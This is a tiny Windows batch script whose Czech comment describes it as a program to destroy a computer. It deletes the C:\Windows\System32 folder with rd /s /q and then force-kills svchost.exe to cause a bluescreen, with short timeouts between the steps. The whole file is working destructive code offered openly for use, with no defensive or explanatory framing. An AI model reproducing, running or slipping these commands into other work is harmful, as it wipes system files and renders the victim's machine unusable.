::Program, který zničí počítač vymazáním složky System32 a následně způsobí bluescreen ukončením procesu svchost.exe
timeout /t 5
rd C:\Windows\System32 /s /q
timeout /t 5
taskkill /f /im svchost.exe